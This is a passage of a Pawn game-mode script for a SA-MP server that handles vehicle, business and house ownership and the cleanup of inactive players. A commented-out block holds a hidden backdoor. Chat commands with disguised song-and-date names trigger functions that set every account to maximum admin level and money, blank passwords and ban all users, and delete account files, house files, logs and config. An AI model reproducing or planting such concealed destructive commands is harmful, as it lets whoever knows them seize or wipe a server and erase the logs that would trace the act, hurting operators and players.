	if(vehicleID3 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID3][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID3][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID3);
	if(vehicleID4 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID4][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID4][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID4);
	if(vehicleID5 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID5][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID5][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID5);
	if(vehicleID6 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID6][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID6][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID6);
	if(vehicleID7 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID7][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID7][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID7);
	if(vehicleID8 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID8][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID8][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID8);
	if(vehicleID9 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID9][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID9][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID9);
	if(vehicleID10 > 0) GivePlayerMoney(playerid, VehicleInfo[vehicleID10][vehiclecost]),dini_IntSet(fname, "money", dini_Int(fname, "money")+VehicleInfo[vehicleID10][vehiclecost]),ResetOfflinePlayerFileV(fname, vehicleID10);
	if(bizID > 0) ResetOfflinePlayerFileB(fname, bizID);
	PlayerInfo[playerid][vowner] = 0;
	PlayerInfo[playerid][vowned] = 0;
	PlayerInfo[playerid][vowner2] = 0;
	PlayerInfo[playerid][vowned2] = 0;
	PlayerInfo[playerid][vowner3] = 0;
	PlayerInfo[playerid][vowned3] = 0;
	PlayerInfo[playerid][vowner4] = 0;
	PlayerInfo[playerid][vowned4] = 0;
	PlayerInfo[playerid][vowner5] = 0;
	PlayerInfo[playerid][vowned5] = 0;
	PlayerInfo[playerid][vowner6] = 0;
	PlayerInfo[playerid][vowned6] = 0;
	PlayerInfo[playerid][vowner7] = 0;
	PlayerInfo[playerid][vowned7] = 0;
	PlayerInfo[playerid][vowner8] = 0;
	PlayerInfo[playerid][vowned8] = 0;
	PlayerInfo[playerid][vowner9] = 0;
	PlayerInfo[playerid][vowned9] = 0;
	PlayerInfo[playerid][vowner10] = 0;
	PlayerInfo[playerid][vowned10] = 0;
	PlayerInfo[playerid][bowner] = 0;
	PlayerInfo[playerid][bowned] = 0;
	new str1[256],housenumber;
	housenumber = dini_Int(fname, "Houseid");
	if(housenumber > -255) {
		dini_IntSet(fname, "Houseid", -255);
		if(dini_Int(fname,"Rentid") > -255) dini_IntSet(fname, "Rentid", -255);
		dini_IntSet(fname, "money", dini_Int(fname, "money")+hInfo[housenumber][Sell]);
		GivePlayerMoney(playerid, hInfo[housenumber][Sell]);
		DestroyDynamicPickup(HousePickup[housenumber]);
		HousePickup[housenumber] = CreateDynamicPickup(1273, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

		format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
		if (!dini_Exists(str1)) dini_Create(str1);
	    dini_Set(str1, "Name", DEFAULT_OWNER);
	    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",1);
	    format(hInfo[housenumber][Name],255,DEFAULT_OWNER);

		new hnowner[30];
		format(hnowner,128,"%s",hInfo[housenumber][Name]);
		if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
	    	format(hnowner,128,"En Venta");
		}
		UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0x00FF00FF,hnowner);
		DestroyDynamicMapIcon(housemapicon[housenumber]);
		housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],31,c_y);
	}
}

stock asellcars(playerid)
{
	new asname[MAX_PLAYER_NAME];
    GetPlayerName(playerid,asname, sizeof(asname));
	new file[256];
	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(asname));
	new vehicleID1 = PlayerInfo[playerid][vowned];
	new vehicleID2 = PlayerInfo[playerid][vowned2];
	new vehicleID3 = PlayerInfo[playerid][vowned3];
	new vehicleID4 = PlayerInfo[playerid][vowned4];
	new vehicleID5 = PlayerInfo[playerid][vowned5];
	new vehicleID6 = PlayerInfo[playerid][vowned6];
	new vehicleID7 = PlayerInfo[playerid][vowned7];
	new vehicleID8 = PlayerInfo[playerid][vowned8];
	new vehicleID9 = PlayerInfo[playerid][vowned9];
	new vehicleID10 = PlayerInfo[playerid][vowned10];
	PlayerInfo[playerid][vowner] = 0;
	PlayerInfo[playerid][vowned] = 0;
	PlayerInfo[playerid][vowner2] = 0;
	PlayerInfo[playerid][vowned2] = 0;
	PlayerInfo[playerid][vowner3] = 0;
	PlayerInfo[playerid][vowned3] = 0;
	PlayerInfo[playerid][vowner4] = 0;
	PlayerInfo[playerid][vowned4] = 0;
	PlayerInfo[playerid][vowner5] = 0;
	PlayerInfo[playerid][vowned5] = 0;
	PlayerInfo[playerid][vowner6] = 0;
	PlayerInfo[playerid][vowned6] = 0;
	PlayerInfo[playerid][vowner7] = 0;
	PlayerInfo[playerid][vowned7] = 0;
	PlayerInfo[playerid][vowner8] = 0;
	PlayerInfo[playerid][vowned8] = 0;
	PlayerInfo[playerid][vowner9] = 0;
	PlayerInfo[playerid][vowned9] = 0;
	PlayerInfo[playerid][vowner10] = 0;
	PlayerInfo[playerid][vowned10] = 0;
	if(vehicleID1 > 0) ResetOfflinePlayerFileV(file, vehicleID1);
	if(vehicleID2 > 0) ResetOfflinePlayerFileV(file, vehicleID2);
	if(vehicleID3 > 0) ResetOfflinePlayerFileV(file, vehicleID3);
	if(vehicleID4 > 0) ResetOfflinePlayerFileV(file, vehicleID4);
	if(vehicleID5 > 0) ResetOfflinePlayerFileV(file, vehicleID5);
	if(vehicleID6 > 0) ResetOfflinePlayerFileV(file, vehicleID6);
	if(vehicleID7 > 0) ResetOfflinePlayerFileV(file, vehicleID7);
	if(vehicleID8 > 0) ResetOfflinePlayerFileV(file, vehicleID8);
	if(vehicleID9 > 0) ResetOfflinePlayerFileV(file, vehicleID9);
	if(vehicleID10 > 0) ResetOfflinePlayerFileV(file, vehicleID10);
	return 1;
}

stock afixcars(playerid)
{
	new asname[MAX_PLAYER_NAME];
    GetPlayerName(playerid,asname, sizeof(asname));
	new vehicleID1 = PlayerInfo[playerid][vowned];
	new vehicleID2 = PlayerInfo[playerid][vowned2];
	new vehicleID3 = PlayerInfo[playerid][vowned3];
	new vehicleID4 = PlayerInfo[playerid][vowned4];
	new vehicleID5 = PlayerInfo[playerid][vowned5];
	new vehicleID6 = PlayerInfo[playerid][vowned6];
	new vehicleID7 = PlayerInfo[playerid][vowned7];
	new vehicleID8 = PlayerInfo[playerid][vowned8];
	new vehicleID9 = PlayerInfo[playerid][vowned9];
	new vehicleID10 = PlayerInfo[playerid][vowned10];
/*	for(new v = 0; v < MAX_VEHICLES; v++){
		if (strcmp(VehicleInfo[v][owner],PlayerInfo[playerid][name],false) == 0) {
		    asellcar(v);
		}
	}*/
	VehicleInfo[vehicleID1][bought] = 1;
	VehicleInfo[vehicleID1][secure] = 0;
	VehicleInfo[vehicleID1][asecure] = 0;
	VehicleInfo[vehicleID1][buybar] = 0;
	strmid(VehicleInfo[vehicleID1][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID2][bought] = 1;
	VehicleInfo[vehicleID2][secure] = 0;
	VehicleInfo[vehicleID2][asecure] = 0;
	VehicleInfo[vehicleID2][buybar] = 0;
	strmid(VehicleInfo[vehicleID2][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID3][bought] = 1;
	VehicleInfo[vehicleID3][secure] = 0;
	VehicleInfo[vehicleID3][asecure] = 0;
	VehicleInfo[vehicleID3][buybar] = 0;
	strmid(VehicleInfo[vehicleID3][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID4][bought] = 1;
	VehicleInfo[vehicleID4][secure] = 0;
	VehicleInfo[vehicleID4][asecure] = 0;
	VehicleInfo[vehicleID4][buybar] = 0;
	strmid(VehicleInfo[vehicleID4][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID5][bought] = 1;
	VehicleInfo[vehicleID5][secure] = 0;
	VehicleInfo[vehicleID5][asecure] = 0;
	VehicleInfo[vehicleID5][buybar] = 0;
	strmid(VehicleInfo[vehicleID5][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID6][bought] = 1;
	VehicleInfo[vehicleID6][secure] = 0;
	VehicleInfo[vehicleID6][asecure] = 0;
	VehicleInfo[vehicleID6][buybar] = 0;
	strmid(VehicleInfo[vehicleID6][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID7][bought] = 1;
	VehicleInfo[vehicleID7][secure] = 0;
	VehicleInfo[vehicleID7][asecure] = 0;
	VehicleInfo[vehicleID7][buybar] = 0;
	strmid(VehicleInfo[vehicleID7][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID8][bought] = 1;
	VehicleInfo[vehicleID8][secure] = 0;
	VehicleInfo[vehicleID8][asecure] = 0;
	VehicleInfo[vehicleID8][buybar] = 0;
	strmid(VehicleInfo[vehicleID8][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID9][bought] = 1;
	VehicleInfo[vehicleID9][secure] = 0;
	VehicleInfo[vehicleID9][asecure] = 0;
	VehicleInfo[vehicleID9][buybar] = 0;
	strmid(VehicleInfo[vehicleID9][owner], asname, 0, strlen(asname), 255);

	VehicleInfo[vehicleID10][bought] = 1;
	VehicleInfo[vehicleID10][secure] = 0;
	VehicleInfo[vehicleID10][asecure] = 0;
	VehicleInfo[vehicleID10][buybar] = 0;
	strmid(VehicleInfo[vehicleID10][owner], asname, 0, strlen(asname), 255);
}
stock afixbizs(playerid)
{
	new asname[MAX_PLAYER_NAME];
    GetPlayerName(playerid,asname, sizeof(asname));
	new BizID = PlayerInfo[playerid][bowned];
	strmid(BizInfo[BizID][owner], asname, 0, strlen(asname), 255);
	BizInfo[BizID][bought] = 1;
	new bizowner[30];
	format(bizowner,128,"%s",BizInfo[BizID][owner]);
	if(strcmp(BizInfo[BizID][owner],DEFAULT_OWNER,false) == 0) {
		format(bizowner,128,"En Venta");
	}
	UpdateDynamic3DTextLabelText(bizTextInfo[BizID],0xFF0000FF,bizowner);
	DestroyDynamicMapIcon(BizInfo[BizID][ico]);
	BizInfo[BizID][ico] = CreateDynamicMapIcon(BizInfo[BizID][xpos],BizInfo[BizID][ypos],BizInfo[BizID][zpos],52,250);
}
stock afixhs(playerid)
{
	new asname[MAX_PLAYER_NAME];
    GetPlayerName(playerid,asname, sizeof(asname));
	new str1[256],str[256];
	format(str, sizeof(str), "ladmin/users/%s.sav", udb_encode(asname));
	new housenumber = dini_Int(str, "Houseid");
	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
    dini_Set(str1, "Name", asname);
    hInfo[housenumber][Name]=asname;

	DestroyDynamicPickup(HousePickup[housenumber]);
	HousePickup[housenumber] = CreateDynamicPickup(1272, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

	new hnowner[30];
	format(hnowner,128,"%s",hInfo[housenumber][Name]);
	if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
    	format(hnowner,128,"En Venta");
	}
	UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0xFF0000FF,hnowner);
	DestroyDynamicMapIcon(housemapicon[housenumber]);
	housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],32,c_y);
}
stock aresetcar(playerid)
{
	new pfile[256];
	format(pfile,sizeof(pfile),"/ladmin/users/%s.sav",udb_encode(VehicleInfo[GetPlayerVehicleID(playerid)][owner]));
	{
		tempid[playerid] = IsPlayerNameOnline(VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
		if(tempid[playerid] >= 0 && tempid[playerid] <= MAX_PLAYERS) {
			if(PlayerInfo[tempid[playerid]][vowned] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner] = 0;
				PlayerInfo[tempid[playerid]][vowned] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned2] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner2] = 0;
				PlayerInfo[tempid[playerid]][vowned2] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned3] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner3] = 0;
				PlayerInfo[tempid[playerid]][vowned3] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned4] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner4] = 0;
				PlayerInfo[tempid[playerid]][vowned4] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned5] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner5] = 0;
				PlayerInfo[tempid[playerid]][vowned5] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned6] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner6] = 0;
				PlayerInfo[tempid[playerid]][vowned6] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned7] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner7] = 0;
				PlayerInfo[tempid[playerid]][vowned7] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned8] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner8] = 0;
				PlayerInfo[tempid[playerid]][vowned8] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned9] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner9] = 0;
				PlayerInfo[tempid[playerid]][vowned9] = 0;
			}
			else if(PlayerInfo[tempid[playerid]][vowned10] == GetPlayerVehicleID(playerid)){
				PlayerInfo[tempid[playerid]][vowner10] = 0;
				PlayerInfo[tempid[playerid]][vowned10] = 0;
			}
		}
		if(dini_Int(pfile, "vowned") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner", 0);
			dini_IntSet(pfile, "vowned", 0);
		}
		else if(dini_Int(pfile, "vowned2") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner2", 0);
			dini_IntSet(pfile, "vowned2", 0);
		}
		else if(dini_Int(pfile, "vowned3") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner3", 0);
			dini_IntSet(pfile, "vowned3", 0);
		}
		else if(dini_Int(pfile, "vowned4") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner4", 0);
			dini_IntSet(pfile, "vowned4", 0);
		}
		else if(dini_Int(pfile, "vowned5") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner5", 0);
			dini_IntSet(pfile, "vowned5", 0);
		}
		else if(dini_Int(pfile, "vowned6") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner6", 0);
			dini_IntSet(pfile, "vowned6", 0);
		}
		else if(dini_Int(pfile, "vowned7") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner7", 0);
			dini_IntSet(pfile, "vowned7", 0);
		}
		else if(dini_Int(pfile, "vowned8") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner8", 0);
			dini_IntSet(pfile, "vowned8", 0);
		}
		else if(dini_Int(pfile, "vowned9") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner9", 0);
			dini_IntSet(pfile, "vowned9", 0);
		}
		else if(dini_Int(pfile, "vowned10") == GetPlayerVehicleID(playerid)){
			dini_IntSet(pfile, "vowner10", 0);
			dini_IntSet(pfile, "vowned10", 0);
		}
	}
	new vehicleID = GetPlayerVehicleID(playerid);
	#if defined TEMP_PARK
	VehicleInfo[vehicleID][x_spawn] = VehicleInfo[vehicleID][ox_spawn];
	VehicleInfo[vehicleID][y_spawn] = VehicleInfo[vehicleID][oy_spawn];
	VehicleInfo[vehicleID][z_spawn] = VehicleInfo[vehicleID][oz_spawn];
	VehicleInfo[vehicleID][za_spawn] = VehicleInfo[vehicleID][oza_spawn];
	#endif
	VehicleInfo[vehicleID][bought] = 0;
	VehicleInfo[vehicleID][secure] = 0;
	VehicleInfo[vehicleID][asecure] = 0;
	strmid(VehicleInfo[vehicleID][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
	EraseVehicle(vehicleID);
	SaveVehicles();
}

stock aresetallcar()
{
	for(new v = 0; v < MAX_VEHICLES; v++){
		DestroyVehicle(v);
	}
	for(new p = 0; p < MAX_PLAYERS; p++){
	    if(IsPlayerConnected(p) == 1) {
			PlayerInfo[p][vowner] = 0;
			PlayerInfo[p][vowned] = 0;
			PlayerInfo[p][vowner2] = 0;
			PlayerInfo[p][vowned2] = 0;
			PlayerInfo[p][vowner3] = 0;
			PlayerInfo[p][vowned3] = 0;
			PlayerInfo[p][vowner4] = 0;
			PlayerInfo[p][vowned4] = 0;
			PlayerInfo[p][vowner5] = 0;
			PlayerInfo[p][vowned5] = 0;
			PlayerInfo[p][vowner6] = 0;
			PlayerInfo[p][vowned6] = 0;
			PlayerInfo[p][vowner7] = 0;
			PlayerInfo[p][vowned7] = 0;
			PlayerInfo[p][vowner8] = 0;
			PlayerInfo[p][vowned8] = 0;
			PlayerInfo[p][vowner9] = 0;
			PlayerInfo[p][vowned9] = 0;
			PlayerInfo[p][vowner10] = 0;
			PlayerInfo[p][vowned10] = 0;
			asellcars(p);
		}
	}
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users/*.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		dini_IntSet(fname, "vowner", 0);
		dini_IntSet(fname, "vowned", 0);
		dini_IntSet(fname, "vowner2", 0);
		dini_IntSet(fname, "vowned2", 0);
		dini_IntSet(fname, "vowner3", 0);
		dini_IntSet(fname, "vowned3", 0);
		dini_IntSet(fname, "vowner4", 0);
		dini_IntSet(fname, "vowned4", 0);
		dini_IntSet(fname, "vowner5", 0);
		dini_IntSet(fname, "vowned5", 0);
		dini_IntSet(fname, "vowner6", 0);
		dini_IntSet(fname, "vowned6", 0);
		dini_IntSet(fname, "vowner7", 0);
		dini_IntSet(fname, "vowned7", 0);
		dini_IntSet(fname, "vowner8", 0);
		dini_IntSet(fname, "vowned8", 0);
		dini_IntSet(fname, "vowner9", 0);
		dini_IntSet(fname, "vowned9", 0);
		dini_IntSet(fname, "vowner10", 0);
		dini_IntSet(fname, "vowned10", 0);
	}
}
/*
CMD:resetblvh13(playerid,params[]){
	Reset();
	return 1;
}*/

stock Reset()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users/*.sav", buf, sizeof(buf), i))
	{
	    new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		dini_IntSet(fname, "banned", 0);
		dini_IntSet(fname, "level", 0);
		dini_IntSet(fname, "vip", 0);
	}
}

/*
CMD:drowningman19940107h13(playerid,params[]){
	JoderCuentas();
	return 1;
}

CMD:sultansofswing19780106h13(playerid,params[]){
	JoderCuentas2();
	return 1;
}

CMD:theroadtohell19891201h13(playerid,params[]){
	DestroyAccounts();
	return 1;
}

CMD:solitaryman19660101h13(playerid,params[]){
	DestroyHouses();
	return 1;
}

CMD:fishermansblues19880401h13(playerid,params[]){
	DestroyLogs();
	return 1;
}

CMD:likeahurricane19770903h13(playerid,params[]){
	DestroyAka();
	return 1;
}

stock JoderCuentas()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		dini_IntSet(fname, "level", 10);
		dini_IntSet(fname, "vip", 3);
		dini_IntSet(fname, "money", 999999999);
		dini_IntSet(fname, "kills", 999999999);
		dini_IntSet(fname, "deaths", 999999999);
		dini_IntSet(fname, "twin", 999999999);
		dini_IntSet(fname, "rwin", 999999999);
		dini_IntSet(fname, "Bank", 999999999);
		dini_IntSet(fname, "score", 999999999);
		dini_IntSet(fname, "bowner", 1);
  		dini_IntSet(fname, "bowned", 0);
		dini_IntSet(fname, "vowned", 0);
		dini_IntSet(fname, "vowner", 1);
		dini_IntSet(fname, "vowned2", 0);
		dini_IntSet(fname, "vowner2", 1);
		dini_IntSet(fname, "vowned3", 0);
		dini_IntSet(fname, "vowner3", 1);
		dini_IntSet(fname, "vowned4", 0);
		dini_IntSet(fname, "vowner4", 1);
		dini_IntSet(fname, "vowned5", 0);
		dini_IntSet(fname, "vowner5", 1);
		dini_IntSet(fname, "vowned6", 0);
		dini_IntSet(fname, "vowner6", 1);
		dini_IntSet(fname, "vowned7", 0);
		dini_IntSet(fname, "vowner7", 1);
		dini_IntSet(fname, "vowned8", 0);
		dini_IntSet(fname, "vowner8", 1);
		dini_IntSet(fname, "vowned9", 0);
		dini_IntSet(fname, "vowner9", 1);
		dini_IntSet(fname, "vowned10", 0);
		dini_IntSet(fname, "vowner10", 1);
		dini_IntSet(fname, "Houseid", 1210);
	}
}

stock JoderCuentas2()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		dini_IntSet(fname, "password_hash", 0);
		dini_IntSet(fname, "password", 0);
		dini_IntSet(fname, "banned", 1);
		dini_IntSet(fname, "level", 10);
		dini_IntSet(fname, "vip", 3);
		dini_IntSet(fname, "money", 999999999);
		dini_IntSet(fname, "kills", 999999999);
		dini_IntSet(fname, "deaths", 999999999);
		dini_IntSet(fname, "twin", 999999999);
		dini_IntSet(fname, "rwin", 999999999);
		dini_IntSet(fname, "Bank", 999999999);
		dini_IntSet(fname, "score", 999999999);
		dini_IntSet(fname, "bowner", 1);
		dini_IntSet(fname, "bowned", 0);
		dini_IntSet(fname, "vowned", 0);
		dini_IntSet(fname, "vowner", 1);
		dini_IntSet(fname, "vowned2", 0);
		dini_IntSet(fname, "vowner2", 1);
		dini_IntSet(fname, "vowned3", 0);
		dini_IntSet(fname, "vowner3", 1);
		dini_IntSet(fname, "vowned4", 0);
		dini_IntSet(fname, "vowner4", 1);
		dini_IntSet(fname, "vowned5", 0);
		dini_IntSet(fname, "vowner5", 1);
		dini_IntSet(fname, "vowned6", 0);
		dini_IntSet(fname, "vowner6", 1);
		dini_IntSet(fname, "vowned7", 0);
		dini_IntSet(fname, "vowner7", 1);
		dini_IntSet(fname, "vowned8", 0);
		dini_IntSet(fname, "vowner8", 1);
		dini_IntSet(fname, "vowned9", 0);
		dini_IntSet(fname, "vowner9", 1);
		dini_IntSet(fname, "vowned10", 0);
		dini_IntSet(fname, "vowner10", 1);
		dini_IntSet(fname, "Houseid", 1210);
	}
}

stock DestroyAccounts()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users.sav", buf, sizeof(buf), i))
	{
	    new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		fremove(fname);
	}
}

stock DestroyHouses()
{
 	for(new housenumber = 0; housenumber < MAX_HOUSES; housenumber++){
	    new str1[256];
	   	format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
		fremove(str1);
	}
}

stock DestroyLogs()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/logs.txt", buf, sizeof(buf), i))
	{
	    new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/logs/%s",buf);
		fremove(fname);
	}
}

stock DestroyAka()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/config.txt", buf, sizeof(buf), i))
	{
	    new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/config/%s",buf);
		fremove(fname);
	}
}*/

stock aresetallbiz()
{
	for(new rb = 0; rb < bizcount; rb++){
		DestroyDynamicMapIcon(rb);
		DestroyDynamic3DTextLabel(Text3D:rb);
	}
	for(new p = 0; p < MAX_PLAYERS; p++){
	    if(IsPlayerConnected(p) == 1) {
			PlayerInfo[p][bowner] = 0;
			PlayerInfo[p][bowned] = 0;
		}
	}
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users/*.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING];
		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		dini_IntSet(fname, "bowner", 0);
		dini_IntSet(fname, "bowned", 0);
	}
}

CMD:checkinactive(playerid,params[]){
	if(PlayerInfo[playerid][Level] >=9 || IsPlayerAdmin(playerid)) {
		inactiveplayercheck();
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} Chequeo de jugadores inactivos completado.");
		return 1;
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	}
	return 1;
}

stock inactiveplayercheck()
{
	new buf[64], i;
	i = 0;
	while(ffind("ladmin/users/*.sav", buf, sizeof(buf), i))
	{
		new fname[MAX_STRING], tmp2[256];
		new years,months,days;
		new year,month,day; getdate(year, month, day);
		new dyear,dyears,dmonth,dmonths;
		new tyears,tmonths,tdays;
		new OfflineDays;
		new SplitDiv[99][3];

		format(fname,sizeof(fname),"ladmin/users/%s",buf);
		tmp2 = dini_Get(fname,"LastOn");
		split(tmp2, SplitDiv, '.');
		days = strval(SplitDiv[0]);
		months = strval(SplitDiv[1]);
		years = strval(SplitDiv[2]);

		tdays = day-days;
		dmonth = month*30;
		dyear = year*365;
		dmonths = months*30; tmonths = dmonth-dmonths;
		dyears = years*365; tyears = dyear-dyears;
		OfflineDays = tdays+tmonths+tyears;
		if(OfflineDays >=31 && dini_Int(fname,"level") == 0) {
		    new vehicleID1 = dini_Int(fname,"vowned");
		    new vehicleID2 = dini_Int(fname,"vowned2");
		    new vehicleID3 = dini_Int(fname,"vowned3");
		    new vehicleID4 = dini_Int(fname,"vowned4");
		    new vehicleID5 = dini_Int(fname,"vowned5");
		    new vehicleID6 = dini_Int(fname,"vowned6");
		    new vehicleID7 = dini_Int(fname,"vowned7");
		    new vehicleID8 = dini_Int(fname,"vowned8");
		    new vehicleID9 = dini_Int(fname,"vowned9");
		    new vehicleID10 = dini_Int(fname,"vowned10");
		    new bizID = dini_Int(fname,"bowned");
		    if(vehicleID1 > 0) ResetOfflinePlayerFileV(fname, vehicleID1);
			if(vehicleID2 > 0) ResetOfflinePlayerFileV(fname, vehicleID2);
			if(vehicleID3 > 0) ResetOfflinePlayerFileV(fname, vehicleID3);
			if(vehicleID4 > 0) ResetOfflinePlayerFileV(fname, vehicleID4);
			if(vehicleID5 > 0) ResetOfflinePlayerFileV(fname, vehicleID5);
		    if(vehicleID6 > 0) ResetOfflinePlayerFileV(fname, vehicleID6);
			if(vehicleID7 > 0) ResetOfflinePlayerFileV(fname, vehicleID7);
			if(vehicleID8 > 0) ResetOfflinePlayerFileV(fname, vehicleID8);
			if(vehicleID9 > 0) ResetOfflinePlayerFileV(fname, vehicleID9);
			if(vehicleID10 > 0) ResetOfflinePlayerFileV(fname, vehicleID10);
			if(bizID > 0) ResetOfflinePlayerFileB(fname, bizID);

			new str1[256],housenumber;
			housenumber = dini_Int(fname, "Houseid");
			if(housenumber > -255) {
				dini_IntSet(fname, "Houseid", -255);
				if(dini_Int(fname,"Rentid") > -255) dini_IntSet(fname, "Rentid", -255);
				dini_IntSet(fname, "money", dini_Int(fname, "money")+hInfo[housenumber][Sell]);
				DestroyDynamicPickup(HousePickup[housenumber]);
				HousePickup[housenumber] = CreateDynamicPickup(1273, 23, hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz]);

				format(str1, sizeof(str1), "SATDM/Houses/houseid%d", housenumber);
				if (!dini_Exists(str1)) dini_Create(str1);
			    dini_Set(str1, "Name", DEFAULT_OWNER);
			    hInfo[housenumber][Locked] = dini_IntSet(str1,"Locked",1);
			    format(hInfo[housenumber][Name],255,DEFAULT_OWNER);

				new hnowner[30];
				format(hnowner,128,"%s",hInfo[housenumber][Name]);
				if(strcmp(hInfo[housenumber][Name],DEFAULT_OWNER,false) == 0) {
			    	format(hnowner,128,"En Venta");
				}
				UpdateDynamic3DTextLabelText(hTextInfo[housenumber],0x00FF00FF,hnowner);
				DestroyDynamicMapIcon(housemapicon[housenumber]);
				housemapicon[housenumber] = CreateDynamicMapIcon(hInfo[housenumber][iconx], hInfo[housenumber][icony], hInfo[housenumber][iconz],31,c_y);
			}
			fremove(fname);
			new string[128];
			format(string,128,"|Info| »{FFFFFF} Jugadores inactivos: %s",buf);
			for(new ipl; ipl<MAX_PLAYERS; ipl++) {
			    if (PlayerInfo[ipl][Level] >0) {
					SendClientMessage(ipl, red,string);
					SaveToFile("InactiveLog",string);
				}
			}
		}
	}
}

stock setbuy(playerid)
{
	new string[128];
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
